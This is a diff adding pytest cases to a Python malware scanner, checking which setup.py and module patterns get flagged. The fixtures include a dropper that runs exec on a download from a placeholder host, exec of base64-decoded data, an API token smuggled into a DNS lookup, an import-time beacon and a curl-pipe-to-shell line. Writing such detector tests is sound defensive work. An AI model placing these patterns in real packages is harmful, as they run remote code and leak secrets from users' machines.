@@ -13693,3 +13693,118 @@ class TestAnOfficialInstallerInADockerfile:
     def test_an_unknown_host_is_not(self, tmp_path) -> None:
         severity = self._severity(tmp_path, "curl -LsSf https://setup.invalid/install.sh | sh")
         assert severity is Severity.HIGH
+
+
+class TestHarmlessFormsThePatternTierCannotSee:
+    @staticmethod
+    def _rules(tmp_path, name: str, source: str) -> set[str]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / name).write_text(source, encoding="utf-8")
+        return {
+            f.rule_id
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if f.severity >= Severity.HIGH
+        }
+
+    def test_exec_of_the_packages_own_version_line(self, tmp_path) -> None:
+        source = (
+            "import urllib.request\nfrom setuptools import setup\n"
+            "def version():\n"
+            "    for l in open('src/pkg/__init__.py').readlines():\n"
+            "        if l.startswith('Version'):\n            D = {}\n            exec(l.strip(), D)\n"
+            "            return D['Version']\n"
+            "urllib.request.urlopen('https://pypi.org/simple/')\n"
+            "setup(name='pkg', version=version())\n"
+        )
+        assert not {r for r in self._rules(tmp_path, "setup.py", source) if "DROPPER" in r}
+
+    def test_exec_of_a_download_beside_it_is_still_a_dropper(self, tmp_path) -> None:
+        source = (
+            "import urllib.request\nfrom setuptools import setup\n"
+            "exec(urllib.request.urlopen('https://h.invalid/x').read())\n"
+            "setup(name='pkg')\n"
+        )
+        assert {r for r in self._rules(tmp_path, "setup.py", source) if "DROPPER" in r}
+
+    def test_a_label_decoded_into_literal_eval(self, tmp_path) -> None:
+        source = (
+            "import builtins\nfrom ast import literal_eval\nfrom base64 import decodebytes\n"
+            "def decode_label(label):\n"
+            "    return literal_eval(decodebytes(label.encode('ascii')).decode('ascii'))\n"
+            "rl_exec = getattr(builtins, 'exec')\n"
+        )
+        assert "SUSPECT.DECODE_EXEC.001" not in self._rules(tmp_path, "utils.py", source)
+
+    def test_a_decode_into_exec_is_still_decode_exec(self, tmp_path) -> None:
+        source = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
+        assert "SUSPECT.DECODE_EXEC.001" in self._rules(tmp_path, "utils.py", source)
+
+
+class TestResolvingYourOwnNameUnderDotLocal:
+    @staticmethod
+    def _rules(tmp_path, lookup: str) -> set[str]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "interfaces.py").write_text(
+            "import os, socket\n"
+            "token = os.environ.get('API_TOKEN')\n"
+            f"addresses = socket.gethostbyname_ex({lookup})[2]\n",
+            encoding="utf-8",
+        )
+        return {
+            f.rule_id
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+        }
+
+    def test_hostname_dot_local_is_not_dns_exfiltration(self, tmp_path) -> None:
+        assert "SUSPECT.EXFIL.DNS.001" not in self._rules(
+            tmp_path, "socket.gethostname() + '.local'"
+        )
+
+    def test_data_in_a_label_still_is(self, tmp_path) -> None:
+        assert "SUSPECT.EXFIL.DNS.001" in self._rules(tmp_path, "token + '.collect.invalid'")
+
+
+class TestARunTestsScriptIsTestInfrastructure:
+    def test_runtests_is_test_material(self) -> None:
+        from cordon_scanner.detect.secrets import is_test_material
+
+        assert is_test_material("cython-3.3.0/runtests.py")
+        assert not is_test_material("cython-3.3.0/runner.py")
+
+
+class TestAConstructorRunsWhenItsClassIsBuilt:
+    SOURCE = (
+        "import socket, requests\n"
+        "class Tracker:\n"
+        "    def __init__(self, url):\n"
+        "        requests.post(url, json={'host': socket.gethostname()})\n"
+    )
+
+    @staticmethod
+    def _beacon(tmp_path, source: str) -> list:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "tracker.py").write_text(source, encoding="utf-8")
+        return [
+            f
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if "BEACON" in f.rule_id
+        ]
+
+    def test_an_unbuilt_class_is_on_request(self, tmp_path) -> None:
+        assert all(f.severity <= Severity.MEDIUM for f in self._beacon(tmp_path, self.SOURCE))
+
+    def test_one_built_at_import_is_not(self, tmp_path) -> None:
+        found = self._beacon(tmp_path, self.SOURCE + "Tracker('collect.invalid')\n")
+        assert any(f.severity >= Severity.HIGH for f in found)
